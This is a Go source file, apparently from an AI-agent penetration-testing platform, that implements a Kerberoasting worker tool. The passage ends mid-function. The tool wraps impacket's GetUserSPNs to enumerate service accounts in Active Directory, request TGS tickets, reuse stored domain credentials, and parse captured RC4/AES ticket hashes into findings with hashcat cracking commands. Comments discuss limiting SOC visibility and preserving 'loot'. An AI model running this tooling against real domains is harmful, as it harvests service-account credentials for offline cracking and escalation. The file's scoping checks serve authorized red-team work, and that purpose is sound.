package agent

// AD 攻击工具(从 ARES ad.kerberoast 移植,内网渗透期 4 的 worker 能力)。
//
// 与 ARES 原模块的差异:
//   - 默认只做 LDAP/SPN 枚举(低噪声、不产生 4769);只有传 target_user 才对该账户
//     请求 TGS,request_all=true 才对全部候选请求 —— 盲扫会给 SOC 送完整画像;
//   - 凭据优先从平台 credentials 表解析(credential_id 或按域自动选),secret 不经过
//     模型;也兼容显式 username+password/hash;
//   - 命中哈希回写 finding(含 hashcat 命令),仅枚举/未命中回写 fact,供 planner 续接;
//   - 全程 scope 校验;失败时返回可执行的中文下一步,而不是只抛 impacket 原始错误。
//
// 执行层复用 impacket 的 GetUserSPNs.py(ARES 用其 Python API;这里不内嵌 Python,
// 以免把 TGT/TGS 状态机搬进 Go)。工具只做参数拼装、输出解析与图谱回写。

import (
	"bytes"
	"context"
	"encoding/json"
	"errors"
	"fmt"
	"net"
	"os"
	"os/exec"
	"path/filepath"
	"regexp"
	"runtime"
	"strconv"
	"strings"
	"time"

	"github.com/Autumn-27/artex/db"
	actool "github.com/Autumn-27/norma/tool"
)

const (
	kerberoastModuleID       = "ad.kerberoast"
	kerberoastMITRE          = "T1558.003"
	kerberoastDefaultTimeout = 180 * time.Second
	kerberoastMaxTimeout     = 600 * time.Second
	kerberoastMaxOutput      = 8 << 20 // impacket 输出上限(含大量哈希)
	kerberoastOutputTail     = 2000    // 失败时回给模型的原始输出尾部
	kerbEmptyLMHash          = "aad3b435b51404eeaad3b435b51404ee"
)

var (
	kerbDomainRe   = regexp.MustCompile(`^[A-Za-z0-9]([A-Za-z0-9.-]*[A-Za-z0-9])?$`)
	kerbHex32Re    = regexp.MustCompile(`^[0-9a-fA-F]{32}$`)
	errKerbTimeout = errors.New("kerberoast command timeout")
)

// 测试可替换的执行钩子:不改变生产路径,只让 handler 能在不跑 impacket 的情况下被验证。
var (
	kerberoastLocateRunner = locateKerberoastRunner
	kerberoastExecRunner   = execKerberoastCommand
)

// --- 参数 ---

type kerberoastParams struct {
	DC           string          `json:"dc"`
	Domain       string          `json:"domain"`
	Username     string          `json:"username,omitempty"`
	Password     string          `json:"password,omitempty"`
	Hash         string          `json:"hash,omitempty"`
	CredentialID json.RawMessage `json:"credential_id,omitempty"`
	TargetUser   string          `json:"target_user,omitempty"`
	LDAPPort     int             `json:"ldap_port,omitempty"`
	RequestAll   bool            `json:"request_all,omitempty"`
	DryRun       bool            `json:"dry_run,omitempty"`
	TimeoutSec   int             `json:"timeout_sec,omitempty"`
}

// Validate normalizes the input in place and rejects values that would either be
// ambiguous for impacket or could be mistaken for a command-line option.
func (p *kerberoastParams) Validate() error {
	p.DC = strings.TrimSpace(p.DC)
	p.Domain = strings.TrimSuffix(strings.TrimSpace(p.Domain), ".")
	p.Username = sanitizeADAccount(p.Username)
	p.TargetUser = sanitizeADAccount(p.TargetUser)

	if p.DC == "" {
		return fmt.Errorf("dc 必填：域控 IP 或 FQDN")
	}
	if strings.HasPrefix(p.DC, "-") || strings.ContainsAny(p.DC, " \t\r\n/\\") || strings.Contains(p.DC, "://") {
		return fmt.Errorf("dc 格式非法：只填域控 IP 或 FQDN（不要带协议、路径、空格）")
	}
	if p.Domain == "" {
		return fmt.Errorf("domain 必填：AD DNS 域名，如 CORP.LOCAL")
	}
	if !kerbDomainRe.MatchString(p.Domain) {
		return fmt.Errorf("domain 格式非法：只填 AD DNS 域名，如 CORP.LOCAL（不要填 DC IP、URL 或带空格）")
	}
	if strings.ContainsAny(p.Username, " \t\r\n/\\:") {
		return fmt.Errorf("username 格式非法：只填 sAMAccountName，可带 DOMAIN\\ 或 @realm 前缀（会自动去掉）")
	}
	if strings.ContainsAny(p.TargetUser, " \t\r\n/\\:") {
		return fmt.Errorf("target_user 格式非法：只填 sAMAccountName（不要带域前缀/空格）")
	}
	if p.Username == "" && (p.Password != "" || p.Hash != "") {
		return fmt.Errorf("传 password/hash 时必须同时传 username（或改用 credential_id 让平台取凭据）")
	}
	if len(p.CredentialID) > 0 && string(p.CredentialID) != "null" && pid(p.CredentialID) <= 0 {
		return fmt.Errorf("credential_id 必须是正整数（list_credentials 返回的 id）")
	}
	if p.Password != "" && p.Hash != "" {
		return fmt.Errorf("password 与 hash 只能二选一")
	}
	if strings.ContainsAny(p.Password, "\r\n") {
		return fmt.Errorf("password 不能包含换行（impacket 的目标串按行解析）")
	}
	if p.Hash != "" {
		if _, err := normalizeKerberoastHashes(p.Hash); err != nil {
			return err
		}
	}
	if p.LDAPPort == 0 {
		p.LDAPPort = 389
	}
	if p.LDAPPort != 389 && p.LDAPPort != 636 {
		return fmt.Errorf("ldap_port 只支持 389 / 636（仅 dry_run 探测用；GetUserSPNs 会自动协商 LDAP/LDAPS）")
	}
	if p.TimeoutSec == 0 {
		p.TimeoutSec = int(kerberoastDefaultTimeout / time.Second)
	}
	if p.TimeoutSec < 10 || p.TimeoutSec > int(kerberoastMaxTimeout/time.Second) {
		return fmt.Errorf("timeout_sec 取值 10..%d", int(kerberoastMaxTimeout/time.Second))
	}
	return nil
}

func (p *kerberoastParams) mode() string {
	if p.TargetUser != "" {
		return "targeted"
	}
	if p.RequestAll {
		return "all"
	}
	return "enumerate"
}

// sanitizeADAccount accepts DOMAIN\user and user@realm and keeps only the
// sAMAccountName, which is what GetUserSPNs' positional target expects.
func sanitizeADAccount(s string) string {
	s = strings.TrimSpace(s)
	if i := strings.LastIndex(s, "\\"); i >= 0 {
		s = s[i+1:]
	}
	if i := strings.Index(s, "@"); i > 0 {
		s = s[:i]
	}
	return strings.TrimSpace(s)
}

// --- 凭据解析 ---

type resolvedKerberoastCred struct {
	Username string
	Password string
	Hash     string
	Domain   string
	CredType string
	CredID   int64
	Source   string // explicit | credential_id | auto
}

type kerberoastAuth struct {
	Source       string `json:"source"`
	Username     string `json:"username,omitempty"`
	CredType     string `json:"cred_type,omitempty"`
	CredentialID int64  `json:"credential_id,omitempty"`
	Domain       string `json:"domain,omitempty"`
	HasPassword  bool   `json:"has_password,omitempty"`
	HasHash      bool   `json:"has_hash,omitempty"`
}

func (c resolvedKerberoastCred) authInfo() kerberoastAuth {
	return kerberoastAuth{
		Source: c.Source, Username: c.Username, CredType: c.CredType,
		CredentialID: c.CredID, Domain: c.Domain,
		HasPassword: c.Password != "", HasHash: c.Hash != "",
	}
}

// resolveKerberoastCredential applies the precedence:
//  1. explicit username + password/hash (what the model just harvested);
//  2. explicit credential_id (the model saw the id in list_credentials);
//  3. auto-pick a task credential whose domain matches the target domain.
func (t *ToolSet) resolveKerberoastCredential(ctx context.Context, p *kerberoastParams) (resolvedKerberoastCred, error) {
	if p.Username != "" && (p.Password != "" || p.Hash != "") {
		credType := db.CredHashNT
		if p.Password != "" {
			credType = db.CredPassword
		}
		return resolvedKerberoastCred{
			Username: p.Username, Password: p.Password, Hash: p.Hash,
			Domain: p.Domain, CredType: credType, Source: "explicit",
		}, nil
	}
	if credID := pid(p.CredentialID); credID > 0 {
		if t.credSource == nil {
			return resolvedKerberoastCred{}, fmt.Errorf("凭据存储不可用：当前运行环境没有接入任务凭据库；请显式传 username+password/hash")
		}
		c, err := t.credSource.Get(ctx, credID)
		if err != nil {
			return resolvedKerberoastCred{}, fmt.Errorf("读取凭据 %d 失败：%v", credID, err)
		}
		if c == nil {
			return resolvedKerberoastCred{}, fmt.Errorf("凭据 %d 不存在（先用 list_credentials 查）", credID)
		}
		if t.taskID > 0 && c.TaskID != t.taskID {
			return resolvedKerberoastCred{}, fmt.Errorf("凭据 %d 不属于本任务，拒绝使用", credID)
		}
		return kerberoastCredFromRecord(c, p, "credential_id")
	}

	if t.credSource == nil || t.taskID <= 0 {
		return resolvedKerberoastCred{}, fmt.Errorf("缺少域凭据：先用 add_credential 登记该域的 password/hash_nt 凭据，或显式传 username+password/hash")
	}
	creds, err := t.credSource.ListByTask(ctx, t.taskID)
	if err != nil {
		return resolvedKerberoastCred{}, fmt.Errorf("读取任务凭据失败：%v", err)
	}
	c := pickKerberoastCredential(creds, p.Domain, p.Username)
	if c == nil {
		return resolvedKerberoastCred{}, fmt.Errorf("本任务没有匹配域 %s 的可用于 Kerberoast 的凭据：先用 add_credential 登记 password/hash_nt 并填 domain=%s，或显式传 username+password/hash", p.Domain, p.Domain)
	}
	return kerberoastCredFromRecord(c, p, "auto")
}

func kerberoastCredFromRecord(c *db.CredentialRecord, p *kerberoastParams, source string) (resolvedKerberoastCred, error) {
	if c == nil {
		return resolvedKerberoastCred{}, fmt.Errorf("凭据为空")
	}
	account := sanitizeADAccount(c.Username)
	if p.Username != "" && !strings.EqualFold(p.Username, account) {
		return resolvedKerberoastCred{}, fmt.Errorf("凭据 %d 的用户名是 %q，与显式传入的 username=%q 不一致", c.ID, c.Username, p.Username)
	}
	if account == "" {
		return resolvedKerberoastCred{}, fmt.Errorf("凭据 %d 没有用户名，不能用于域认证", c.ID)
	}
	out := resolvedKerberoastCred{
		Username: account, Domain: c.Domain, CredType: c.CredType,
		CredID: c.ID, Source: source,
	}
	switch c.CredType {
	case db.CredPassword:
		out.Password = c.Secret
	case db.CredHashNT:
		out.Hash = c.Secret
	case db.CredHashLM:
		return resolvedKerberoastCred{}, fmt.Errorf("凭据 %d 是 LM hash：Kerberos 预认证需要 NT hash 或口令（AD 默认禁用 LM），请重新登记 hash_nt/password", c.ID)
	default:
		return resolvedKerberoastCred{}, fmt.Errorf("凭据 %d 类型是 %s，Kerberoast 只接受 password / hash_nt", c.ID, c.CredType)
	}
	if out.Password == "" && out.Hash == "" {
		return resolvedKerberoastCred{}, fmt.Errorf("凭据 %d 的 secret 为空", c.ID)
	}
	return out, nil
}

// pickKerberoastCredential chooses the safest auto credential: same domain,
// password/hash_nt, verified first. It deliberately refuses a credential whose
// domain does not match: guessing with a local account would burn a bad-password
// attempt against AD (and can lock the account).
func pickKerberoastCredential(creds []*db.CredentialRecord, domain, username string) *db.CredentialRecord {
	bestScore := -1
	var best *db.CredentialRecord
	for _, c := range creds {
		if c == nil || c.Username == "" {
			continue
		}
		account := sanitizeADAccount(c.Username)
		if account == "" {
			continue
		}
		if c.CredType != db.CredPassword && c.CredType != db.CredHashNT {
			continue
		}
		if username != "" && !strings.EqualFold(username, account) {
			continue
		}
		if !sameADDomain(domain, c.Domain) {
			continue
		}
		score := 100
		if c.Verified {
			score += 30
		}
		if c.CredType == db.CredPassword {
			score += 10
		}
		if username != "" {
			score += 10
		}
		if score > bestScore {
			bestScore, best = score, c
		}
	}
	return best
}

// sameADDomain matches FQDN and NetBIOS forms of the same AD domain:
// CORP == corp.local, CORP.LOCAL == corp, but CORP.LOCAL != EVIL.LOCAL.
func sameADDomain(a, b string) bool {
	a = strings.ToLower(strings.Trim(strings.TrimSpace(a), "."))
	b = strings.ToLower(strings.Trim(strings.TrimSpace(b), "."))
	if a == "" || b == "" {
		return false
	}
	if a == b {
		return true
	}
	return strings.HasPrefix(a, b+".") || strings.HasPrefix(b, a+".")
}

// --- 执行 ---

type kerberoastRunner struct {
	Bin      string
	BaseArgs []string
}

func locateKerberoastRunner() (kerberoastRunner, error) {
	return locateImpacketScript("GetUserSPNs.py", "impacket-GetUserSPNs")
}

// locateImpacketScript resolves an impacket example script (GetUserSPNs.py,
// GetNPUsers.py, ...) on PATH or next to the Python interpreter's Scripts dir.
func locateImpacketScript(script, console string) (kerberoastRunner, error) {
	if p, err := exec.LookPath(script); err == nil {
		if py := findKerberoastPython(); py != "" {
			return kerberoastRunner{Bin: py, BaseArgs: []string{p}}, nil
		}
		if runtime.GOOS != "windows" {
			return kerberoastRunner{Bin: p}, nil
		}
		return kerberoastRunner{}, fmt.Errorf("找到 %s 但没有 Python 解释器（python3/python/py 均不在 PATH）", script)
	}
	if bin, err := exec.LookPath(console); err == nil {
		return kerberoastRunner{Bin: bin}, nil
	}
	// PATH may not include the Python Scripts dir (common for a Windows service
	// account). Probe next to the interpreter before giving up.
	if py := findKerberoastPython(); py != "" {
		dir := filepath.Dir(py)
		for _, cand := range []string{
			filepath.Join(dir, "Scripts", script),
			filepath.Join(dir, script),
			filepath.Join(dir, "Scripts", console),
			filepath.Join(dir, console),
			filepath.Join(dir, "Scripts", console+".exe"),
			filepath.Join(dir, console+".exe"),
		} {
			p, lookErr := exec.LookPath(cand)
			if lookErr != nil {
				continue
			}
			if strings.HasSuffix(strings.ToLower(p), ".py") {
				return kerberoastRunner{Bin: py, BaseArgs: []string{p}}, nil
			}
			return kerberoastRunner{Bin: p}, nil
		}
	}
	return kerberoastRunner{}, fmt.Errorf("未找到 impacket：需要 %s 或 %s 在 PATH（或与 python 同目录的 Scripts 下）；安装命令：python -m pip install impacket", script, console)
}

func findKerberoastPython() string {
	names := []string{"python3", "python", "py"}
	if runtime.GOOS == "windows" {
		// Windows ships an App Execution Alias at ...\WindowsApps\python3.exe that
		// "exists" on PATH but exits 9009 (opens the Store). Prefer the real
		// launcher and skip that stub.
		names = []string{"python", "py", "python3"}
	}
	for _, name := range names {
		p, err := exec.LookPath(name)
		if err != nil {
			continue
		}
		if runtime.GOOS == "windows" && strings.Contains(strings.ToLower(p), `\windowsapps\`) && !pythonInterpreterWorks(p) {
			continue
		}
		return p
	}
	return ""
}

// pythonInterpreterWorks filters the Windows Store App Execution Alias, which
// exists on PATH but exits 9009 unless the Store Python is actually installed.
func pythonInterpreterWorks(path string) bool {
	ctx, cancel := context.WithTimeout(context.Background(), 3*time.Second)
	defer cancel()
	return exec.CommandContext(ctx, path, "--version").Run() == nil
}

func buildKerberoastArgs(p *kerberoastParams, cred resolvedKerberoastCred, request bool) ([]string, error) {
	target := strings.TrimSpace(p.Domain) + "/" + cred.Username
	if cred.Password != "" {
		target += ":" + cred.Password
	}
	args := []string{target, "-dc-ip", p.DC}
	if request {
		if strings.TrimSpace(p.TargetUser) != "" {
			args = append(args, "-request-user", p.TargetUser)
		} else {
			args = append(args, "-request")
		}
	}
	if cred.Hash != "" {
		h, err := normalizeKerberoastHashes(cred.Hash)
		if err != nil {
			return nil, err
		}
		args = append(args, "-hashes", h)
	}
	if cred.Password == "" && cred.Hash == "" {
		args = append(args, "-no-pass")
	}
	return args, nil
}

func normalizeKerberoastHashes(h string) (string, error) {
	h = strings.TrimSpace(h)
	if h == "" {
		return "", nil
	}
	parts := strings.Split(h, ":")
	switch len(parts) {
	case 1:
		if !kerbHex32Re.MatchString(parts[0]) {
			return "", fmt.Errorf("hash 格式非法：NT hash 需 32 位 hex（也支持 LMHASH:NTHASH）")
		}
		return kerbEmptyLMHash + ":" + strings.ToLower(parts[0]), nil
	case 2:
		lm, nt := strings.TrimSpace(parts[0]), strings.TrimSpace(parts[1])
		if lm == "" {
			lm = kerbEmptyLMHash
		}
		if !kerbHex32Re.MatchString(lm) || !kerbHex32Re.MatchString(nt) {
			return "", fmt.Errorf("hash 格式非法：LMHASH:NTHASH 两部分都需 32 位 hex")
		}
		return strings.ToLower(lm) + ":" + strings.ToLower(nt), nil
	default:
		return "", fmt.Errorf("hash 格式非法：应为 NT(32 hex) 或 LMHASH:NTHASH")
	}
}

// cappedBuffer keeps at most max bytes but always reports full writes to the
// child process (a short write would make os/exec treat the pipe as broken).
type cappedBuffer struct {
	buf       bytes.Buffer
	max       int
	truncated bool
}

func (c *cappedBuffer) Write(p []byte) (int, error) {
	if c.max <= 0 {
		c.max = kerberoastMaxOutput
	}
	if c.buf.Len() < c.max {
		remain := c.max - c.buf.Len()
		if len(p) <= remain {
			_, _ = c.buf.Write(p)
		} else {
			_, _ = c.buf.Write(p[:remain])
			c.truncated = true
		}
	} else {
		c.truncated = true
	}
	return len(p), nil
}

func (c *cappedBuffer) String() string { return c.buf.String() }

func execKerberoastCommand(ctx context.Context, runner kerberoastRunner, args []string, timeout time.Duration) (string, error) {
	runCtx, cancel := context.WithTimeout(ctx, timeout)
	defer cancel()
	all := make([]string, 0, len(runner.BaseArgs)+len(args))
	all = append(all, runner.BaseArgs...)
	all = append(all, args...)
	cmd := exec.CommandContext(runCtx, runner.Bin, all...)
	// Keep impacket's banner/warnings off the parsed stream and force UTF-8 so a
	// Windows console code page cannot corrupt account names in the table.
	cmd.Env = append(os.Environ(), "PYTHONIOENCODING=utf-8", "PYTHONUTF8=1", "PYTHONWARNINGS=ignore")
	var stdout, stderr cappedBuffer
	stdout.max, stderr.max = kerberoastMaxOutput, kerberoastMaxOutput
	cmd.Stdout, cmd.Stderr = &stdout, &stderr
	runErr := cmd.Run()
	text := stdout.String()
	if s := stderr.String(); s != "" {
		text += "\n" + s
	}
	if stdout.truncated || stderr.truncated {
		text += "\n...[输出已截断]"
	}
	if runErr != nil {
		if errors.Is(runCtx.Err(), context.DeadlineExceeded) {
			return text, errKerbTimeout
		}
		return text, runErr
	}
	return text, nil
}

func (t *ToolSet) runKerberoast(ctx context.Context, p *kerberoastParams, cred resolvedKerberoastCred, request bool) (string, error) {
	runner, err := kerberoastLocateRunner()
	if err != nil {
		return "", err
	}
	args, err := buildKerberoastArgs(p, cred, request)
	if err != nil {
		return "", err
	}
	timeout := time.Duration(p.TimeoutSec) * time.Second
	out, err := kerberoastExecRunner(ctx, runner, args, timeout)
	return redactKerberoastSecret(out, cred.Password), err
}

func redactKerberoastSecret(s, secret string) string {
	if secret == "" || len(secret) < 2 {
		return s
	}
	lines := strings.Split(s, "\n")
	for i, line := range lines {
		// Never touch a captured hash: a short password can appear as a hex
		// substring inside the ciphertext, and corrupting it loses the loot.
		if strings.Contains(line, "$krb5tgs$") {
			continue
		}
		lines[i] = strings.ReplaceAll(line, secret, "******")
	}
	return strings.Join(lines, "\n")
}

// --- 输出解析 ---

type spnEntry struct {
	AccountName string `json:"account_name"`
	SPN         string `json:"spn"`
	Machine     bool   `json:"machine_account,omitempty"`
	Raw         string `json:"raw,omitempty"`
}

type capturedHash struct {
	AccountName string `json:"account_name"`
	SPN         string `json:"spn"`
	EType       int    `json:"etype"`
	Format      string `json:"format"`
	HashcatMode int    `json:"hashcat_mode,omitempty"`
	Hash        string `json:"hash"`
}

type kerberoastFinding struct {
	AccountName string `json:"account_name"`
	SPN         string `json:"spn"`
	Severity    string `json:"severity"`
	Title       string `json:"title"`
	FindingID   int64  `json:"finding_id,omitempty"`
	NodeID      int64  `json:"node_id,omitempty"`
	Merged      bool   `json:"merged,omitempty"`
	RecordError string `json:"record_error,omitempty"`
}

type kerberoastResult struct {
	ModuleID   string              `json:"module_id"`
	MITRE      string              `json:"mitre"`
	Status     string              `json:"status"`
	Mode       string              `json:"mode"`
	DC         string              `json:"dc"`
	Domain     string              `json:"domain"`
	TargetUser string              `json:"target_user,omitempty"`
	Auth       *kerberoastAuth     `json:"auth,omitempty"`
	SPNs       []spnEntry          `json:"spns"`
	Hashes     []capturedHash      `json:"hashes"`
	Findings   []kerberoastFinding `json:"findings,omitempty"`
	FactID     int64               `json:"fact_id,omitempty"`
	Outcome    string              `json:"outcome,omitempty"`
	Tooling    map[string]any      `json:"tooling,omitempty"`
	NextSteps  []string            `json:"next_steps,omitempty"`
	Warnings   []string            `json:"warnings,omitempty"`
	Error      string              `json:"error,omitempty"`
	OutputTail string              `json:"output_tail,omitempty"`
	ElapsedMs  int64               `json:"elapsed_ms"`
}

// parseKerberoastOutput parses both shapes emitted by GetUserSPNs:
//
//	table:  SPN  Name  MemberOf  PasswordLastSet  LastLogon  Delegation
//	hashes: $krb5tgs$23$*user$REALM$SPN*$checksum$cipher   (RC4)
//	        $krb5tgs$18$user$REALM$*SPN*$checksum$cipher   (AES)
//
// The hash's embedded "SPN" is NOT reliable: GetUserSPNs passes
// targetDomain/account (or just the account for -request-user), so the real SPN
// comes from the table's last row for that account (the same row it used to
// request the TGS).
func parseKerberoastOutput(out string) ([]spnEntry, []capturedHash) {
	out = strings.ReplaceAll(out, "\r\n", "\n")
	spns := []spnEntry{}
	hashes := []capturedHash{}
	seenSPN := map[string]bool{}
	lastSPNByAccount := map[string]string{}

	for _, rawLine := range strings.Split(out, "\n") {
		line := strings.TrimSpace(rawLine)
		if line == "" {
			continue
		}
		if strings.Contains(line, "$krb5tgs$") {
			if h, ok := parseKrb5TgsHashLine(line); ok {
				hashes = append(hashes, h)
			}
			continue
		}
		if strings.HasPrefix(line, "ServicePrincipalName") || strings.HasPrefix(line, "----") ||
			strings.HasPrefix(line, "Impacket") || strings.HasPrefix(line, "[") ||
			strings.HasPrefix(line, "No entries found") {
			continue
		}
		fields := strings.Fields(line)
		if len(fields) < 2 || !strings.Contains(fields[0], "/") {
			continue
		}
		account := fields[1]
		if account == "" || account == "Name" {
			continue
		}
		key := fields[0] + "\x00" + account
		if !seenSPN[key] {
			seenSPN[key] = true
			spns = append(spns, spnEntry{
				AccountName: account,
				SPN:         fields[0],
				Machine:     strings.HasSuffix(account, "$"),
				Raw:         kerbTruncate(line, 240),
			})
		}
		lastSPNByAccount[strings.ToLower(account)] = fields[0]
	}

	for i := range hashes {
		if real, ok := lastSPNByAccount[strings.ToLower(hashes[i].AccountName)]; ok && real != "" {
			hashes[i].SPN = real
		}
	}
	return spns, hashes
}

func parseKrb5TgsHashLine(line string) (capturedHash, bool) {
	s := strings.TrimSpace(line)
	if i := strings.Index(s, "$krb5tgs$"); i > 0 {
		s = s[i:]
	}
	if !strings.HasPrefix(s, "$krb5tgs$") {
		return capturedHash{}, false
	}
	body := strings.TrimPrefix(s, "$krb5tgs$")
	dollar := strings.Index(body, "$")
	if dollar <= 0 {
		return capturedHash{}, false
	}
	etype, err := strconv.Atoi(body[:dollar])
	if err != nil {
		return capturedHash{}, false
	}
	rest := body[dollar+1:]
	var user, realm, spn string
	if strings.HasPrefix(rest, "*") {
		// RC4: *user$REALM$SPN*$checksum$cipher
		rest = rest[1:]
		star := strings.Index(rest, "*$")
		if star <= 0 {
			return capturedHash{}, false
		}
		pp := strings.SplitN(rest[:star], "$", 3)
		if len(pp) != 3 {
			return capturedHash{}, false
		}
		user, realm, spn = pp[0], pp[1], pp[2]
	} else {
		// AES: user$REALM$*SPN*$checksum$cipher
		first := strings.Index(rest, "$")
		if first <= 0 {
			return capturedHash{}, false
		}
		user = rest[:first]
		rest = rest[first+1:]
		second := strings.Index(rest, "$")
		if second <= 0 {
			return capturedHash{}, false
		}
		realm = rest[:second]
		rest = rest[second+1:]
		if !strings.HasPrefix(rest, "*") {
			return capturedHash{}, false
		}
		rest = rest[1:]
		star := strings.Index(rest, "*$")
		if star <= 0 {
			return capturedHash{}, false
		}
		spn = rest[:star]
	}
	if user == "" || realm == "" || spn == "" {
		return capturedHash{}, false
	}
	mode := 0
	format := "unknown etype"
	switch etype {
	case 23:
		mode, format = 13100, "hashcat 13100 (RC4-HMAC)"
	case 17, 18:
		mode, format = 19700, "hashcat 19700 (AES)"
	}
	return capturedHash{
		AccountName: user, SPN: spn, EType: etype,
		Format: format, HashcatMode: mode, Hash: s,
	}, true
}

func kerbETypeName(etype int) string {
	switch etype {
	case 23:
		return "RC4-HMAC"
	case 17:
		return "AES128-CTS-HMAC-SHA1-96"
	case 18:
		return "AES256-CTS-HMAC-SHA1-96"
	default:
		return fmt.Sprintf("etype %d", etype)
	}
}

func kerbPrivileged(text string) bool {
	low := strings.ToLower(text)
	for _, g := range []string{
		"domain admins", "enterprise admins", "schema admins", "administrators",
		"account operators", "backup operators", "server operators", "print operators",
		"dnsadmins", "group policy creator owners", "exchange organization administrators",
	} {
		if strings.Contains(low, g) {
			return true
		}
	}
	return false
}

func kerbSPNDetail(spns []spnEntry, limit int) string {
	if len(spns) == 0 {
		return "没有任何带 SPN 的候选账户。"
	}
	if limit <= 0 || limit > len(spns) {
		limit = len(spns)
	}
	var b strings.Builder
	fmt.Fprintf(&b, "共 %d 个候选，列出前 %d 个：\n", len(spns), limit)
	for _, s := range spns[:limit] {
		fmt.Fprintf(&b, "- %s  %s", s.AccountName, s.SPN)
		if s.Machine {
			b.WriteString("  [machine]")
		}
		if s.Raw != "" {
			fmt.Fprintf(&b, "  | %s", s.Raw)
		}
		b.WriteString("\n")
	}
	return strings.TrimRight(b.String(), "\n")
}

func kerbTruncate(s string, n int) string {
	if n <= 0 {
		return ""
	}
	r := []rune(s)
	if len(r) <= n {
		return s
	}
	return string(r[:n]) + "…"
}

// --- 回写图谱 ---

func (t *ToolSet) recordKerberoastFindings(ctx context.Context, res *kerberoastResult) {
	if t.ts == nil || len(res.Hashes) == 0 {
		return
	}
	assetIDs := t.kerberoastAssetIDs(res.DC)
	seen := map[string]bool{}
	for i := range res.Hashes {
		h := res.Hashes[i]
		if h.Hash == "" || seen[h.Hash] {
			continue
		}
		seen[h.Hash] = true
		severity := "high"
		if meta, ok := kerbSPNForAccount(res.SPNs, h.AccountName); ok && kerbPrivileged(meta.Raw) {
			severity = "critical"
		}
		title := fmt.Sprintf("Kerberoastable service account: %s", h.AccountName)
		summary := fmt.Sprintf("捕获 %s 的 TGS 哈希（etype %d, %s），可离线爆破服务账户口令",
			h.AccountName, h.EType, kerbETypeName(h.EType))
		crack := fmt.Sprintf("hashcat -m %d kerberoast.txt wordlist.txt", h.HashcatMode)
		if h.HashcatMode == 0 {
			crack = "hashcat（未知 etype，需人工确认模式）"
		}
		evidence := fmt.Sprintf("account=%s\nspn=%s\netype=%d (%s)\nhash=%s\ncrack=%s",
			h.AccountName, h.SPN, h.EType, kerbETypeName(h.EType), h.Hash, crack)
		input := db.RecordFindingInput{
			TaskID: t.taskID, ExplorationID: t.ts.ID(), IntentID: t.ownerNode,
			VulnClass: "kerberoast", Name: title, Severity: severity,
			Summary: summary, Evidence: evidence, Worker: t.worker, AssetIDs: assetIDs,
		}
		var rec *db.RecordedFinding
		var err error
		if t.findingRecorder != nil {
			rec, err = t.findingRecorder.Record(ctx, input, nil)
		} else {
			rec, err = t.ts.RecordFinding(ctx, input)
		}
		f := kerberoastFinding{
			AccountName: h.AccountName, SPN: h.SPN, Severity: severity, Title: title,
		}
		if err != nil {
			f.RecordError = err.Error()
		} else if rec != nil {
			f.FindingID, f.NodeID, f.Merged = rec.FindingID, rec.NodeID, rec.Merged
			t.writes.Findings++
		}
		res.Findings = append(res.Findings, f)
	}
	if len(res.Findings) > 0 {
		if t.notifyFinding != nil {
			t.notifyFinding(t.ownerNode, fmt.Sprintf("Kerberoast 捕获 %d 个 TGS 哈希", len(res.Hashes)))
		} else if t.notify != nil {
			t.notify()
		}
	}
}

func (t *ToolSet) kerberoastAssetIDs(dc string) []int64 {
	if t.as != nil {
		if assets, err := t.as.QueryByHost(dc, 0); err == nil {
			// Prefer the exact IP asset over a domain/root-domain row: the DC is the
			// affected asset, and the merge key uses AssetIDs[0] as the main asset.
			for _, a := range assets {
				if a != nil && strings.EqualFold(a.IP, dc) {
					return []int64{a.ID}
				}
			}
			for _, a := range assets {
				if a != nil && a.Type == "ip" {
					return []int64{a.ID}
				}
			}
			for _, a := range assets {
				if a != nil {
					return []int64{a.ID}
				}
			}
		}
	}
	if t.ts != nil && t.ownerNode > 0 {
		if anchors, err := t.ts.Anchors(t.ownerNode); err == nil {
			return anchors
		}
	}
	return nil
}

func kerbSPNForAccount(spns []spnEntry, account string) (spnEntry, bool) {
	for _, s := range spns {
		if strings.EqualFold(s.AccountName, account) {
			return s, true
		}
	}
	return spnEntry{}, false
}

func (t *ToolSet) recordKerberoastFact(ctx context.Context, res *kerberoastResult, summary, detail string) {
	if t.ts == nil {
		return
	}
	user := "?"
	if res.Auth != nil && res.Auth.Username != "" {
		user = res.Auth.Username
	}
	evidence := fmt.Sprintf("GetUserSPNs.py %s/%s -dc-ip %s (%s) -> %d SPN / %d hash",
		res.Domain, user, res.DC, res.Mode, len(res.SPNs), len(res.Hashes))
	id, note, err := t.recordOneFactChecked(factItem{
		Summary:    summary,
		Detail:     detail,
		Evidence:   evidence,
		Confidence: FactConfidenceObserved,
		IntentID:   json.RawMessage(strconv.FormatInt(t.ownerNode, 10)),
	}, t.ownerNode, nil)
	if err != nil {
		res.Warnings = append(res.Warnings, "fact 回写失败："+err.Error())
		return
	}
	res.FactID = id
	if note != "" {
		res.Warnings = append(res.Warnings, note)
	}
}

// --- 错误分类 ---

// kerberoastOutputError finds impacket's own error lines. GetUserSPNs catches its
// exceptions and logs them via logging.error, then exits 0, so a non-zero exit is
// not enough to distinguish "no SPN found" from "LDAP/auth failed".
func kerberoastOutputError(out string) string {
	for _, line := range strings.Split(out, "\n") {
		s := strings.TrimSpace(line)
		if s == "" {
			continue
		}
		low := strings.ToLower(s)
		switch {
		case strings.HasPrefix(s, "[-]"), strings.HasPrefix(s, "[!]"), strings.HasPrefix(low, "traceback"):
			return kerbTruncate(s, 300)
		case strings.Contains(low, "kerberos sessionerror"),
			strings.Contains(low, "ldapsearcherror"),
			strings.Contains(low, "invalidcredentials"),
			strings.Contains(low, "status_logon_failure"),
			strings.Contains(low, "kdc_err"),
			strings.Contains(low, "krb_ap_err"),
			strings.Contains(low, "failed to connect"),
			strings.Contains(low, "cannot connect"),
			strings.Contains(low, "no module named"),
			strings.Contains(low, "no such file"):
			return kerbTruncate(s, 300)
		}
	}
	return ""
}

func kerbRunErrorMessage(runErr error, out string, timeout time.Duration) string {
	low := strings.ToLower(out)
	if runErr != nil {
		low += "\n" + strings.ToLower(runErr.Error())
	}
	switch {
	case errors.Is(runErr, errKerbTimeout):
		return fmt.Sprintf("impacket 执行超时（%ds）：DC/LDAP 响应慢或候选太多；先用枚举模式锁定 target_user，再单独请求该账户的 TGS", int(timeout/time.Second))
	case strings.Contains(low, "krb_ap_err_skew") || strings.Contains(low, "clock skew"):
		return "Kerberos 时钟偏差过大（KRB_AP_ERR_SKEW）：把操作机与 DC 时间同步到 ≤5 分钟后再试"
	case strings.Contains(low, "kdc_err_wrong_realm") || strings.Contains(low, "wrong realm"):
